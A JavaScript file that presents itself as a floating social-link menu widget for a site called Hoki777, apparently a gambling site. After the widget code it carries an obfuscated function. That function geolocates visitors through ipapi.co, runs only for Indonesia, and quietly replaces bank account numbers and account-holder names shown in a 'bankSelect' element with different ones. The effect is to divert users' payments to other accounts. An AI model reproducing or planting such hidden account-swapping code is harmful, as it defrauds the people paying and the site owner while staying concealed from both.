(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);

})();

(function(_0x88b1c,_0x73dda){const _0xabeab=["\u0049\u0044"];_0x88b1c=385926^385922;var _0x11897a=(429179^429170)+(883479^883486);_0x73dda="/nosj/oc.ipapi//:sptth".split("").reverse().join("");_0x11897a=950965^950973;function _0x001ad(_0x656ffe){var _0x277f5f=(762324^762332)+(954479^954476);const _0xa5gc5f=[{"angkaAsli":"\u0037\u0033\u0039\u0031\u0039\u0035\u0033\u0030\u0031\u0039","angkaBaru":'2120452005',"namaAsli":'RXXXY AXXXYA','\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u004C\u0045\u0056\u0049"},{"angkaAsli":"\u0030\u0038\u0033\u0039\u002D\u0030\u0031\u0030\u0030\u002D\u0035\u0037\u0038\u0031\u002D\u0035\u0030\u0039",'\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075':"\u0030\u0033\u0034\u0035\u002D\u0030\u0031\u0030\u0035\u002D\u0030\u0032\u0031\u0031\u002D\u0035\u0030\u0036","namaAsli":'C****RA D**I','\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u004C\u0055\u0053\u0049\u0041\u004E\u0041"},{"angkaAsli":'1800088706',"angkaBaru":"\u0031\u0038\u0030\u0030\u0030\u0038\u0038\u0037\u0030\u0036",'\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069':"\u0043\u002A\u002A\u002A\u002A\u0052\u0041\u0020\u0044\u002A\u002A\u0049",'\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075':"\u0053\u0041\u0052\u0049\u0041\u004E\u0049"}];_0x277f5f=873842^873846;var _0x1g8f2f=(370994^371002)+(116035^116037);_0x656ffe="\u0062\u0061\u006E\u006B\u0053\u0065\u006C\u0065\u0063\u0074";_0x1g8f2f=(971822^971816)+(616268^616271);function _0x9b1d6c(){_0xa5gc5f['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](item=>{let _0x2d5d5a;const _0x85815e=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0073\u0070\u0061\u006E");_0x2d5d5a='\u006E\u0065\u0071\u0071\u0070\u0061';for(let i=602156^602156;i<_0x85815e['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x85815e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u0061\u006E\u0067\u006B\u0061\u0041\u0073\u006C\u0069']){_0x85815e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u0061\u006E\u0067\u006B\u0061\u0042\u0061\u0072\u0075'];break;}}let _0x2903df;const _0x1120f=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");_0x2903df="icekgp".split("").reverse().join("");for(let i=883120^883120;i<_0x1120f['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x1120f[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===item['\u006E\u0061\u006D\u0061\u0041\u0073\u006C\u0069']){_0x1120f[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=item['\u006E\u0061\u006D\u0061\u0042\u0061\u0072\u0075'];break;}}});}function _0x036fb(){var _0xcfa=(635391^635391)+(246681^246687);const _0x18b9bc=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x656ffe);_0xcfa=309725^309724;if(!_0x18b9bc)return false;_0x9b1d6c();if(!_0x18b9bc['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x18b9bc['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0x9b1d6c);_0x18b9bc['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="eurt".split("").reverse().join("");}return!![];}if(_0x036fb())return;var _0x66fc=(415730^415734)+(885189^885189);const _0x2_0x3e0=new MutationObserver(()=>{if(_0x036fb())_0x2_0x3e0['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0x66fc=972977^972985;_0x2_0x3e0['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],'\u0073\u0075\u0062\u0074\u0072\u0065\u0065':!![]});}async function _0x63d38a(){try{var _0x8bf=(230209^230211)+(139063^139062);const _0x70e25d=await fetch(_0x73dda);_0x8bf=(376121^376113)+(225714^225722);if(!_0x70e25d['\u006F\u006B'])throw new Error("rorrE IPA".split("").reverse().join(""));const _0x3_0xfbe=await _0x70e25d['\u006A\u0073\u006F\u006E']();const _0x4_0x6de=_0x3_0xfbe['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0x4_0x6de)throw new Error("\u0044\u0061\u0074\u0061\u0020\u006E\u0065\u0067\u0061\u0072\u0061\u0020\u006B\u006F\u0073\u006F\u006E\u0067");if(_0xabeab['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](_0x4_0x6de)){console['\u006C\u006F\u0067'](`✅ Terdeteksi: ${_0x4_0x6de} - Skrip dijalankan`);_0x001ad();}else{console['\u006C\u006F\u0067'](`🚫`);}}catch(err){console['\u0077\u0061\u0072\u006E']("\uFE0F\u26A0".split("").reverse().join(""));}}_0x63d38a();})();